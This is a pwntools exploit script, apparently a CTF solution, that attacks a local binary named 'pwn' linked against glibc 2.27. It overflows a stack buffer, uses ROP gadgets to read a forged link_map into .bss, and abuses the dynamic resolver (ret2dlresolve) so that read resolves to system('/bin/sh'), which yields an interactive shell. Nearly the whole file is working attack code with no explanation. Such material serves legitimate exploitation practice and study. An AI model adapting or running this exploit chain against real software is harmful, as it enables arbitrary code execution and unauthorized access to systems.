from pwn import *
context(arch="amd64",os = "linux", log_level = "debug")
io = process("./pwn")
gdb.attach(io)
pause()
elf = ELF("pwn")
libc = ELF("../../../glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.27.so")

n64 = lambda x: (x + 0x10000000000000000) & 0xFFFFFFFFFFFFFFFF
pop_rdi_ret = 0x0000000000400583
pop_rsi_ret = 0x0000000000400581
ret = 0x4003de
read_plt = elf.plt["read"]

bss_addr = elf.bss()
# put fake link map at bss+0x800
fake_link_map_addr = bss_addr + 0x800
# build fake link map, resolve read to call _dl_resolve to execve system("/bin/sh")
offset = n64(libc.sym["system"] - libc.sym["read"])
# forge linkmap
fake_link_map = p64(n64(libc.sym["system"] - libc.sym["read"])) # l_addr
fake_link_map = fake_link_map.ljust(0x68,b'\x00')
# forge l_info
fake_link_map += p64(bss_addr) #l_info[5] ->dyn.strtab (not important)
fake_link_map += p64(fake_link_map_addr + 0x100) # pointing l_info[6] Dyn of symtab
fake_link_map = fake_link_map.ljust(0xf8, b'\x00')
fake_link_map += p64(fake_link_map_addr + 0x110)  # l_info[23]
fake_link_map += p64(0) + p64(elf.got["read"] - 8)  # Elf64_Dyn
fake_link_map += p64(0) + p64(fake_link_map_addr + 0x120)  # Elf64_Dyn
fake_link_map += p64(n64(elf.bss() - offset)) + p32(7) + p32(0)  # Elf64_Rel

bin_sh_addr = fake_link_map_addr + len(fake_link_map)
fake_link_map += b"/bin/sh\x00"
main = 0x4004e7
resolve_plt = elf.get_section_by_name('.plt').header.sh_addr

#use ROP to read fake link map into fake link map addr
rop = b"a" * 256 + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(fake_link_map_addr) + p64(0)
rop += p64(read_plt) + p64(pop_rdi_ret) + p64(bin_sh_addr) +p64(ret) + p64(resolve_plt+6) + p64(fake_link_map_addr) + p64(0)
print("resolve_plt+6",hex(resolve_plt+6))

io.sendline(rop)

sleep(0.2)

print("fake_link_map_addr:",hex(fake_link_map_addr))

io.sendline(fake_link_map)
io.interactive()